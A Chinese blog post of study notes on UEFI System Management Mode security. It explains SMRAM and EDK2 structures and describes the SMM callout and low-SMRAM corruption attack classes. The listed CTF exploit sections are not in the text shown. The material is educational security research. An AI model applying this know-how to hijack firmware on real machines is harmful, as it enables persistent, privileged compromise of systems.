<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="写在最前面内核学不下去了，php 和 v8 研究了挺长时间也没搞懂，然后想起了第一次参加华为 hws 时讲的就是 UEFI 安全。当时还是个 crypto + misc 手，什么都没有听懂，所以打算在考研前再重新学习一遍，同时也当作是征战 RealWorld CTF 的第一步把（笑让我感到庆幸的是网上讲的比较好的文章还挺多，让我少走很多的弯路，这篇博客可以当作是我的学习笔记。   UEFI SMM">
<meta property="og:type" content="article">
<meta property="og:title" content="UEFI SMM 漏洞挖掘与利用">
<meta property="og:url" content="https://qanux.github.io/2024/12/14/uefi/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="写在最前面内核学不下去了，php 和 v8 研究了挺长时间也没搞懂，然后想起了第一次参加华为 hws 时讲的就是 UEFI 安全。当时还是个 crypto + misc 手，什么都没有听懂，所以打算在考研前再重新学习一遍，同时也当作是征战 RealWorld CTF 的第一步把（笑让我感到庆幸的是网上讲的比较好的文章还挺多，让我少走很多的弯路，这篇博客可以当作是我的学习笔记。   UEFI SMM">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/13.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/1.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/2.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/3.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/4.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/5.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/6.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/7.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/8.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/9.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/10.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/11.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/12.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/14.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/15.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/16.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/18.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/17.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/19.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/20.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/21.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/22.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/23.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/24.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/25.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/26.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/27.png">
<meta property="og:image" content="https://qanux.github.io/2024/12/14/uefi/28.png">
<meta property="article:published_time" content="2024-12-13T16:00:00.000Z">
<meta property="article:modified_time" content="2024-12-22T16:07:43.633Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="UEFI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/2024/12/14/uefi/13.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>UEFI SMM 漏洞挖掘与利用</title>
    <!-- async scripts -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/11/12/fileuaf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2024/12/14/uefi/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2024/12/14/uefi/&text=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2024/12/14/uefi/&is_video=false&description=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=UEFI SMM 漏洞挖掘与利用&body=Check out this article: https://qanux.github.io/2024/12/14/uefi/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2024/12/14/uefi/&title=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2024/12/14/uefi/&name=UEFI SMM 漏洞挖掘与利用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2024/12/14/uefi/&t=UEFI SMM 漏洞挖掘与利用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UEFI-SMM-%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">UEFI SMM 常见漏洞挖掘与利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">常见漏洞与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMM-Callouts"><span class="toc-number">2.2.1.</span> <span class="toc-text">SMM Callouts</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Low-SMRAM-Corruption"><span class="toc-number">2.2.2.</span> <span class="toc-text">Low SMRAM Corruption</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Arbitrary-SMRAM-Corruption"><span class="toc-number">2.2.3.</span> <span class="toc-text">Arbitrary SMRAM Corruption</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TOCTOU-attacks"><span class="toc-number">2.2.4.</span> <span class="toc-text">TOCTOU attacks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SetVariable-Information-Disclosure"><span class="toc-number">2.2.5.</span> <span class="toc-text">SetVariable() Information Disclosure</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Double-GetVariable"><span class="toc-number">2.2.6.</span> <span class="toc-text">Double GetVariable()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E8%BF%9B%E8%A1%8C%E7%BB%83%E4%B9%A0"><span class="toc-number">3.</span> <span class="toc-text">通过一些题目进行练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UIUCTF-2022-SmmCowsay1"><span class="toc-number">3.1.</span> <span class="toc-text">UIUCTF 2022 SmmCowsay1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">3.1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.1.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UIUCTF-2022-SmmCowsay2"><span class="toc-number">3.2.</span> <span class="toc-text">UIUCTF 2022 SmmCowsay2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DubheCTF-2024-ToySMM"><span class="toc-number">3.3.</span> <span class="toc-text">DubheCTF 2024 ToySMM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">学习的文章</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        UEFI SMM 漏洞挖掘与利用
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-12-13T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-12-14</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/UEFI/" rel="tag">UEFI</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>内核学不下去了，php 和 v8 研究了挺长时间也没搞懂，然后想起了第一次参加华为 hws 时讲的就是 UEFI 安全。当时还是个 crypto + misc 手，什么都没有听懂，所以打算在考研前再重新学习一遍，同时也当作是征战 RealWorld CTF 的第一步把（笑<br>让我感到庆幸的是网上讲的比较好的文章还挺多，让我少走很多的弯路，这篇博客可以当作是我的学习笔记。  </p>
<h2 id="UEFI-SMM-常见漏洞挖掘与利用思路"><a href="#UEFI-SMM-常见漏洞挖掘与利用思路" class="headerlink" title="UEFI SMM 常见漏洞挖掘与利用思路"></a>UEFI SMM 常见漏洞挖掘与利用思路</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>既然说到 UEFI 固件漏洞挖掘，那肯定要先知道 UEFI 是个什么东西，下面的介绍来自于网络：</p>
<blockquote>
<p>UEFI是英文Unified Extensible Firmware Interface 的缩写，翻译成中文就是“统一可拓展固件接口”。它是一种新一代的固件接口标准，取代了传统的 BIOS（Basic Input&#x2F;Output System）标准。<br>在计算机启动时初始化硬件设备、检测系统配置、加载操作系统和应用程序等。与传统的 BIOS 相比，UEFI 具有更多的功能和优势，如支持更大的硬盘容量、更快的启动速度、更多的安全功能、更好的图形界面等。 </p>
</blockquote>
<p>简单的来说，就是电脑开机时用来启动操作系统的程序。（感觉这个说法有点问题）<br>UEFI 存在的目的就是为开发者创造一个统一，便捷的启动环境。<br>UEFI 会在计算机启动阶段与运行阶段提供很丰富的服务来供开发者调用。 </p>
<img src="/2024/12/14/uefi/13.png" class="" title="我的图图呢">   

<p>EDK2全称是EFI Development Kit II，是第二代 UEFI 的官方开发库。如果把全称打出来，就是 Extended Firmware Interface Development Kit II。EDK2 是 UEFI 标准的一份实现源码。  </p>
<p>SSM 是系统管理模式 System Management mode 的缩写，是 Intel 在 80386SL 之后引入 x86 体系结构的一种 CPU 的执行模式。系统管理模式只能通过系统管理中断（System Management Interrupt, SMI）进入，并只能通过执行 RSM 指令退出。在 SMM 模式下一切被都屏蔽，包括所有的中断。SMM 模式下的执行的程序被称作 SMM 处理程序，所有的 SMM 处理程序只能在称作系统管理内存（System Management RAM,SMRAM）的空间内运行。可以通过设置 SMBASE 的寄存器来设置 SMRAM 的空间。<br>SMM 拥有自己的存储空间，称为 SMRAM，可以防止其他模式对其进行访问。<br>SMM 的处理程序只能在 SMRAM 里面运行，所以了解 SMRAM 的结构非常重要。这是出于安全的考虑，毕竟 SMM 有最高的优先级，如果在哪儿都可以运行，那么其它的程序改动了内存里的一点东西，也会影响到 SMM，如果这个改动是恶意的，那后果就不堪设想。<br>结构图如下：  </p>
<img src="/2024/12/14/uefi/1.png" class="" title="我的图图呢">  
<p>SMRAM 的大小不是无限大的，它最初只有 64KB，其起始地址是 SMBASE （这个值保存在一个专门的寄存器中），在 SMBASE+0x8000H 处开始存放的是 SMI 的中断处理程序。而在 SMRAM 的高地址处存放着处理器进入 SMM 时的状态信息，这些信息在处理器退出 SMM 时会被恢复到处理器中。  </p>
<p>系统表（SystemTable）是 edk2 提供的一个最重要也是最基础的数据结构之一，它是沟通内核和应用&#x2F;驱动的桥梁。通过系统表，应用程序和驱动才能够访问到内核和硬件资源。系统表包含了如下信息：  </p>
<ul>
<li>表头</li>
<li>固件信息</li>
<li>标准输入设备，标准输出设备，标准错误输出设备</li>
<li>启动服务表</li>
<li>运行时服务表</li>
<li>系统配置表</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	EFI_TABLE_HEADER           Hdr;                  <span class="comment">/*     0    24 */</span></span><br><span class="line">	CHAR16 *                   FirmwareVendor;       <span class="comment">/*    24     8 */</span></span><br><span class="line">	UINT32                     FirmwareRevision;     <span class="comment">/*    32     4 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* XXX 4 bytes hole, try to pack */</span></span><br><span class="line"></span><br><span class="line">	EFI_HANDLE                 ConsoleInHandle;      <span class="comment">/*    40     8 */</span></span><br><span class="line">	EFI_SIMPLE_TEXT_INPUT_PROTOCOL * ConIn;          <span class="comment">/*    48     8 */</span></span><br><span class="line">	EFI_HANDLE                 ConsoleOutHandle;     <span class="comment">/*    56     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">	EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * ConOut;        <span class="comment">/*    64     8 */</span></span><br><span class="line">	EFI_HANDLE                 StandardErrorHandle;  <span class="comment">/*    72     8 */</span></span><br><span class="line">	EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * StdErr;        <span class="comment">/*    80     8 */</span></span><br><span class="line">	EFI_RUNTIME_SERVICES *     RuntimeServices;      <span class="comment">/*    88     8 */</span></span><br><span class="line">	EFI_BOOT_SERVICES *        BootServices;         <span class="comment">/*    96     8 */</span></span><br><span class="line">	UINTN                      NumberOfTableEntries; <span class="comment">/*   104     8 */</span></span><br><span class="line">	EFI_CONFIGURATION_TABLE *  ConfigurationTable;   <span class="comment">/*   112     8 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* size: 120, cachelines: 2, members: 13 */</span></span><br><span class="line">	<span class="comment">/* sum members: 116, holes: 1, sum holes: 4 */</span></span><br><span class="line">	<span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure>

<p>这里我们主要关注 BootServices，里面有一些我们用得到的函数：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	EFI_TABLE_HEADER           Hdr;                  <span class="comment">/*     0    24 */</span></span><br><span class="line">	EFI_RAISE_TPL              RaiseTPL;             <span class="comment">/*    24     8 */</span></span><br><span class="line">	EFI_RESTORE_TPL            RestoreTPL;           <span class="comment">/*    32     8 */</span></span><br><span class="line">	EFI_ALLOCATE_PAGES         AllocatePages;        <span class="comment">/*    40     8 */</span></span><br><span class="line">	EFI_FREE_PAGES             FreePages;            <span class="comment">/*    48     8 */</span></span><br><span class="line">	EFI_GET_MEMORY_MAP         GetMemoryMap;         <span class="comment">/*    56     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">	EFI_ALLOCATE_POOL          AllocatePool;         <span class="comment">/*    64     8 */</span></span><br><span class="line">	EFI_FREE_POOL              FreePool;             <span class="comment">/*    72     8 */</span></span><br><span class="line">	EFI_CREATE_EVENT           CreateEvent;          <span class="comment">/*    80     8 */</span></span><br><span class="line">	EFI_SET_TIMER              SetTimer;             <span class="comment">/*    88     8 */</span></span><br><span class="line">	EFI_WAIT_FOR_EVENT         WaitForEvent;         <span class="comment">/*    96     8 */</span></span><br><span class="line">	EFI_SIGNAL_EVENT           SignalEvent;          <span class="comment">/*   104     8 */</span></span><br><span class="line">	EFI_CLOSE_EVENT            CloseEvent;           <span class="comment">/*   112     8 */</span></span><br><span class="line">	EFI_CHECK_EVENT            CheckEvent;           <span class="comment">/*   120     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">	EFI_INSTALL_PROTOCOL_INTERFACE InstallProtocolInterface; <span class="comment">/*   128     8 */</span></span><br><span class="line">	EFI_REINSTALL_PROTOCOL_INTERFACE ReinstallProtocolInterface; <span class="comment">/*   136     8 */</span></span><br><span class="line">	EFI_UNINSTALL_PROTOCOL_INTERFACE UninstallProtocolInterface; <span class="comment">/*   144     8 */</span></span><br><span class="line">	EFI_HANDLE_PROTOCOL        HandleProtocol;       <span class="comment">/*   152     8 */</span></span><br><span class="line">	<span class="type">void</span> *                     Reserved;             <span class="comment">/*   160     8 */</span></span><br><span class="line">	EFI_REGISTER_PROTOCOL_NOTIFY RegisterProtocolNotify; <span class="comment">/*   168     8 */</span></span><br><span class="line">	EFI_LOCATE_HANDLE          LocateHandle;         <span class="comment">/*   176     8 */</span></span><br><span class="line">	EFI_LOCATE_DEVICE_PATH     LocateDevicePath;     <span class="comment">/*   184     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">	EFI_INSTALL_CONFIGURATION_TABLE InstallConfigurationTable; <span class="comment">/*   192     8 */</span></span><br><span class="line">	EFI_IMAGE_LOAD             LoadImage;            <span class="comment">/*   200     8 */</span></span><br><span class="line">	EFI_IMAGE_START            StartImage;           <span class="comment">/*   208     8 */</span></span><br><span class="line">	EFI_EXIT                   Exit;                 <span class="comment">/*   216     8 */</span></span><br><span class="line">	EFI_IMAGE_UNLOAD           UnloadImage;          <span class="comment">/*   224     8 */</span></span><br><span class="line">	EFI_EXIT_BOOT_SERVICES     ExitBootServices;     <span class="comment">/*   232     8 */</span></span><br><span class="line">	EFI_GET_NEXT_MONOTONIC_COUNT GetNextMonotonicCount; <span class="comment">/*   240     8 */</span></span><br><span class="line">	EFI_STALL                  Stall;                <span class="comment">/*   248     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 4 boundary (256 bytes) --- */</span></span><br><span class="line">	EFI_SET_WATCHDOG_TIMER     SetWatchdogTimer;     <span class="comment">/*   256     8 */</span></span><br><span class="line">	EFI_CONNECT_CONTROLLER     ConnectController;    <span class="comment">/*   264     8 */</span></span><br><span class="line">	EFI_DISCONNECT_CONTROLLER  DisconnectController; <span class="comment">/*   272     8 */</span></span><br><span class="line">	EFI_OPEN_PROTOCOL          OpenProtocol;         <span class="comment">/*   280     8 */</span></span><br><span class="line">	EFI_CLOSE_PROTOCOL         CloseProtocol;        <span class="comment">/*   288     8 */</span></span><br><span class="line">	EFI_OPEN_PROTOCOL_INFORMATION OpenProtocolInformation; <span class="comment">/*   296     8 */</span></span><br><span class="line">	EFI_PROTOCOLS_PER_HANDLE   ProtocolsPerHandle;   <span class="comment">/*   304     8 */</span></span><br><span class="line">	EFI_LOCATE_HANDLE_BUFFER   LocateHandleBuffer;   <span class="comment">/*   312     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 5 boundary (320 bytes) --- */</span></span><br><span class="line">	EFI_LOCATE_PROTOCOL        LocateProtocol;       <span class="comment">/*   320     8 */</span></span><br><span class="line">	EFI_INSTALL_MULTIPLE_PROTOCOL_INTERFACES InstallMultipleProtocolInterfaces; <span class="comment">/*   328     8 */</span></span><br><span class="line">	EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces; <span class="comment">/*   336     8 */</span></span><br><span class="line">	EFI_CALCULATE_CRC32        CalculateCrc32;       <span class="comment">/*   344     8 */</span></span><br><span class="line">	EFI_COPY_MEM               CopyMem;              <span class="comment">/*   352     8 */</span></span><br><span class="line">	EFI_SET_MEM                SetMem;               <span class="comment">/*   360     8 */</span></span><br><span class="line">	EFI_CREATE_EVENT_EX        CreateEventEx;        <span class="comment">/*   368     8 */</span></span><br><span class="line">	<span class="comment">/* size: 376, cachelines: 6, members: 45 */</span></span><br><span class="line">	<span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125; EFI_BOOT_SERVICES;</span><br></pre></td></tr></table></figure>

<p>启动时服务与运行时服务中为固件编写者提供了许多功能。gBS 与 gRT 是两个全局变量，其分别指向 BootService 与 RuntimeService。其中，操作系统只能访问 RuntimeService，而 BootLoader 则既可以访问 BootService 也可以访问 RuntimeService。  </p>
<h3 id="常见漏洞与利用"><a href="#常见漏洞与利用" class="headerlink" title="常见漏洞与利用"></a>常见漏洞与利用</h3><p>虽然理论上 SMM 代码与外界隔离，但实际上，在许多情况下，非 SMM 代码可以触发甚至影响 SMM 内部运行的代码。由于 SMM 具有复杂的架构和大量“移动部件”，因此攻击面非常广泛，其中包括在通信缓冲区中传递的数据、NVRAM 变量、支持 DMA 的设备等。  </p>
<h4 id="SMM-Callouts"><a href="#SMM-Callouts" class="headerlink" title="SMM Callouts"></a>SMM Callouts</h4><p>这是最基本的 SMM 漏洞类别，发生在 SMM 代码调用位于 SMRAM 边界之外的函数时。最常见的调用场景是 SMI 处理程序试图在其操作中调用 UEFI 启动服务或运行时服务。具有操作系统级权限的攻击者可以在触发 SMI 之前修改这些服务所在的物理页面，从而在调用受影响的服务后劫持特权执行流。<br>下面的流程图来自：<a target="_blank" rel="noopener" href="https://www.c7zero.info/stuff/ANewClassOfVulnInSMIHandlers_csw2015.pdf">https://www.c7zero.info/stuff/ANewClassOfVulnInSMIHandlers_csw2015.pdf</a></p>
<img src="/2024/12/14/uefi/2.png" class="" title="我的图图呢">  

<p>从第四代 Core 微架构 ( Haswell ) 开始，Intel CPU 支持一项名为 SMM_Code_Chk_En 的安全功能。如果启用此安全功能，则一旦 CPU 进入 SMM，就禁止其执行位于 SMRAM 区域之外的任何代码，有点类似于 linux 用户态的 NX 保护。  </p>
<h4 id="Low-SMRAM-Corruption"><a href="#Low-SMRAM-Corruption" class="headerlink" title="Low SMRAM Corruption"></a>Low SMRAM Corruption</h4><p>在正常情况下，用于将参数传递给 SMI 处理程序的通信缓冲区不得与 SMRAM 重叠。此限制的理由很简单：如果不是这种情况，那么每当 SMI 处理程序将一些数据写入通信缓冲区时，它也会在此过程中修改 SMRAM 的某些部分，这是不可取的。  </p>
<img src="/2024/12/14/uefi/3.png" class="" title="我的图图呢">  

<p>在 EDK2 中，负责检查给定缓冲区是否与 SMRAM 重叠的函数称为 SmmIsBufferOutsideSmmValid()。每次调用 SMI 时，都会在通信缓冲区上调用此函数以强制执行此限制。  </p>
